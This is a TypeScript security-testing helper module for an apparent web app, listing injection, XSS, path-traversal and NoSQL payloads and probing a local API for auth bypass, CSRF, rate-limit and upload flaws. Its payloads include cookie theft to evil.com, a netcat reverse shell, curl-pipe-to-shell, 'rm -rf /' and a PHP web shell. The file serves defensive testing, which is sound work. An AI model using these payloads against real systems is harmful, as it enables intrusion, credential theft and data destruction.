/**
 * Security Testing Helpers
 * @since Phase 1.7 - Security Audit Implementation
 *
 * Utilities for security testing including injection prevention,
 * XSS protection, authentication bypass attempts, and compliance validation
 */

import { apiRequest } from "../integration/test-helpers";

/**
 * SQL Injection test payloads
 */
export const SQL_INJECTION_PAYLOADS = [
  "'; DROP TABLE users; --",
  "1' OR '1'='1",
  "admin' --",
  "' UNION SELECT * FROM users --",
  "1; UPDATE users SET role='admin' WHERE email='test@test.com'; --",
  "' OR 1=1 --",
  "'; EXEC xp_cmdshell('net user'); --",
  "' AND 1=(SELECT COUNT(*) FROM users); --",
  "\\'; DROP TABLE bookings; --",
  "1' AND SLEEP(5) --",
];

/**
 * XSS test payloads
 */
export const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg/onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '<iframe src="javascript:alert(`XSS`)">',
  '<body onload=alert("XSS")>',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<script>document.location="http://evil.com"</script>',
  '<img src="x" onerror="fetch(`http://evil.com?cookie=${document.cookie}`)">',
  '<style>*{background:url("javascript:alert(1)")}</style>',
];

/**
 * Path traversal test payloads
 */
export const PATH_TRAVERSAL_PAYLOADS = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..%252f..%252f..%252fetc%252fpasswd",
  "file:///etc/passwd",
  "../../../../../../etc/shadow",
  "..\\..\\..\\..\\..\\..\\..\\..\\..",
  "../.env",
  "../../../../config/database.yml",
];

/**
 * Command injection test payloads
 */
export const COMMAND_INJECTION_PAYLOADS = [
  "; ls -la",
  "| whoami",
  "`cat /etc/passwd`",
  "$(rm -rf /)",
  "&& cat /etc/passwd",
  "; shutdown -h now",
  "| nc evil.com 4444 -e /bin/sh",
  "`curl http://evil.com/shell.sh | sh`",
  "$(wget http://evil.com/malware)",
  '; echo "hacked" > index.html',
];

/**
 * NoSQL injection test payloads
 */
export const NOSQL_INJECTION_PAYLOADS = [
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$regex": ".*"}',
  '{"$where": "this.password == null"}',
  '{"username": {"$ne": null}, "password": {"$ne": null}}',
  '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}',
  '{"username": "admin", "password": {"$gt": ""}}',
  '{"$where": "sleep(5000)"}',
  '{"username": {"$in": ["admin", "root"]}}',
  '{"$comment": "successful MongoDB injection"}',
];

/**
 * Test security headers in response
 */
export async function testSecurityHeaders(url: string): Promise<Record<string, string>> {
  const response = await fetch(url);
  const headers: Record<string, string> = {};

  const securityHeaders = [
    "x-frame-options",
    "x-content-type-options",
    "x-xss-protection",
    "strict-transport-security",
    "content-security-policy",
    "referrer-policy",
    "permissions-policy",
    "x-permitted-cross-domain-policies",
    "x-dns-prefetch-control",
    "x-download-options",
  ];

  securityHeaders.forEach((header) => {
    const value = response.headers.get(header);
    if (value) {
      headers[header] = value;
    }
  });

  return headers;
}

/**
 * Test authentication bypass attempts
 */
export const testAuth = {
  async loginWithoutCredentials(): Promise<any> {
    return apiRequest("/auth/login", "POST", undefined, {});
  },

  async loginWithNullPassword(): Promise<any> {
    return apiRequest("/auth/login", "POST", undefined, {
      email: "test@test.com",
      password: null,
    });
  },

  async loginWithSQLInjection(): Promise<any> {
    return apiRequest("/auth/login", "POST", undefined, {
      email: "admin' --",
      password: "anything",
    });
  },

  async accessWithExpiredToken(expiredToken: string): Promise<any> {
    return apiRequest("/auth/me", "GET", expiredToken);
  },

  async accessWithMalformedToken(): Promise<any> {
    return apiRequest("/auth/me", "GET", "malformed.token.here");
  },

  async accessWithoutToken(): Promise<any> {
    return apiRequest("/auth/me", "GET");
  },

  async register(data: any): Promise<any> {
    return apiRequest("/auth/register", "POST", undefined, data);
  },

  async bruteForceLogin(email: string, attempts: number = 10): Promise<any[]> {
    const responses = [];
    for (let i = 0; i < attempts; i++) {
      const response = await apiRequest("/auth/login", "POST", undefined, {
        email,
        password: `attempt${i}`,
      });
      responses.push(await response.json());
    }
    return responses;
  },
};

/**
 * Test injection vulnerabilities
 */
export const testInjection = {
  async search(query: string): Promise<any> {
    const response = await apiRequest(`/search?q=${encodeURIComponent(query)}`, "GET");
    return {
      status: response.status,
      data: await response.json(),
    };
  },

  async createBooking(data: any, token: string): Promise<any> {
    const response = await apiRequest("/bookings", "POST", token, data);
    return {
      status: response.status,
      data: await response.json(),
    };
  },

  async verifyDatabase(): Promise<{ tablesExist: boolean }> {
    // This would typically check if critical tables still exist
    // For testing purposes, we'll simulate this
    try {
      const response = await apiRequest("/health/check", "GET");
      const health = await response.json();
      return { tablesExist: health.database === "healthy" };
    } catch {
      return { tablesExist: false };
    }
  },
};

/**
 * Test CSRF protection
 */
export const testCSRF = {
  async getCSRFToken(): Promise<string | null> {
    const response = await apiRequest("/auth/csrf-token", "GET");
    if (response.status === 200) {
      const data = await response.json();
      return data.token;
    }
    return null;
  },

  async submitWithoutCSRF(endpoint: string, data: any, token: string): Promise<any> {
    const response = await fetch(
      `${process.env.API_URL || "http://localhost:3000/api"}${endpoint}`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
          // Intentionally omitting CSRF token
        },
        body: JSON.stringify(data),
      }
    );

    return {
      status: response.status,
      data: await response.json(),
    };
  },

  async submitWithInvalidCSRF(endpoint: string, data: any, token: string): Promise<any> {
    const response = await fetch(
      `${process.env.API_URL || "http://localhost:3000/api"}${endpoint}`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
          "X-CSRF-Token": "invalid-csrf-token",
        },
        body: JSON.stringify(data),
      }
    );

    return {
      status: response.status,
      data: await response.json(),
    };
  },
};

/**
 * Test rate limiting
 */
export async function testRateLimit(
  endpoint: string,
  method: string = "GET",
  requestCount: number = 100,
  token?: string
): Promise<{ totalRequests: number; blockedRequests: number; firstBlockedAt: number }> {
  let blockedRequests = 0;
  let firstBlockedAt = 0;

  for (let i = 0; i < requestCount; i++) {
    const response = await apiRequest(endpoint, method, token);

    if (response.status === 429) {
      blockedRequests++;
      if (firstBlockedAt === 0) {
        firstBlockedAt = i + 1;
      }
    }

    // Small delay to avoid overwhelming the server
    await new Promise((resolve) => setTimeout(resolve, 10));
  }

  return {
    totalRequests: requestCount,
    blockedRequests,
    firstBlockedAt,
  };
}

/**
 * Test file upload security
 */
export const testFileUpload = {
  async uploadMaliciousFile(token: string): Promise<any> {
    const maliciousFiles = [
      { name: "shell.php", content: '<?php system($_GET["cmd"]); ?>', type: "text/php" },
      { name: "script.js", content: 'alert("XSS")', type: "application/javascript" },
      { name: "../../../etc/passwd", content: "malicious", type: "text/plain" },
      { name: "virus.exe", content: Buffer.from([0x4d, 0x5a]), type: "application/exe" },
      { name: "large.jpg", content: "x".repeat(100 * 1024 * 1024), type: "image/jpeg" }, // 100MB
    ];

    const results = [];

    for (const file of maliciousFiles) {
      const formData = new FormData();
      const blob = new Blob([file.content], { type: file.type });
      formData.append("file", blob, file.name);

      const response = await fetch(`${process.env.API_URL || "http://localhost:3000/api"}/upload`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${token}`,
        },
        body: formData,
      });

      results.push({
        filename: file.name,
        status: response.status,
        accepted: response.status < 400,
      });
    }

    return results;
  },

  async uploadWithoutAuth(filename: string = "test.jpg"): Promise<any> {
    const formData = new FormData();
    const blob = new Blob(["test content"], { type: "image/jpeg" });
    formData.append("file", blob, filename);

    const response = await fetch(`${process.env.API_URL || "http://localhost:3000/api"}/upload`, {
      method: "POST",
      body: formData,
    });

    return {
      status: response.status,
      data: response.status < 400 ? await response.json() : null,
    };
  },
};

/**
 * Test session security
 */
export const testSession = {
  async hijackSession(stolenToken: string): Promise<any> {
    return apiRequest("/auth/me", "GET", stolenToken);
  },

  async reuseExpiredSession(expiredToken: string): Promise<any> {
    return apiRequest("/auth/me", "GET", expiredToken);
  },

  async concurrentSessions(token: string): Promise<any[]> {
    const requests = Array(5)
      .fill(null)
      .map(() => apiRequest("/auth/me", "GET", token));

    const responses = await Promise.all(requests);
    return Promise.all(responses.map((r) => r.json()));
  },
};

/**
 * Test password security
 */
export const testPassword = {
  weakPasswords: [
    "password",
    "12345678",
    "qwerty123",
    "Password1",
    "admin123",
    "letmein",
    "abc12345",
    "password123",
  ],

  async testWeakPasswords(email: string): Promise<any[]> {
    const results = [];

    for (const password of this.weakPasswords) {
      const response = await apiRequest("/auth/register", "POST", undefined, {
        email,
        password,
        firstName: "Test",
        lastName: "User",
      });

      results.push({
        password,
        accepted: response.status === 201,
      });
    }

    return results;
  },

  async testPasswordInResponse(): Promise<boolean> {
    const response = await apiRequest("/auth/me", "GET");
    const data = await response.json();

    // Check if password hash or plain password is exposed
    return (
      data.hasOwnProperty("password") ||
      data.hasOwnProperty("passwordHash") ||
      data.hasOwnProperty("password_hash")
    );
  },
};

/**
 * Test for information disclosure
 */
export const testInfoDisclosure = {
  async checkErrorMessages(): Promise<any[]> {
    const endpoints = ["/api/invalid-endpoint", "/api/bookings/invalid-id", "/api/auth/login"];

    const results = [];

    for (const endpoint of endpoints) {
      const response = await fetch(`${process.env.API_URL || "http://localhost:3000"}${endpoint}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ invalid: "data" }),
      });

      const data = await response.text();

      results.push({
        endpoint,
        exposesStackTrace: data.includes("Error:") || data.includes("at ") || data.includes(".js:"),
        exposesDatabaseInfo:
          data.includes("postgres") || data.includes("SELECT") || data.includes("TABLE"),
        exposesSystemPaths:
          data.includes("/Users/") || data.includes("C:\\") || data.includes("/home/"),
      });
    }

    return results;
  },

  async checkHeaders(): Promise<any> {
    const response = await fetch(
      `${process.env.API_URL || "http://localhost:3000"}/api/health/check`
    );

    return {
      exposesServer: response.headers.has("server"),
      exposesVersion: response.headers.has("x-powered-by"),
      serverHeader: response.headers.get("server"),
      poweredByHeader: response.headers.get("x-powered-by"),
    };
  },
};
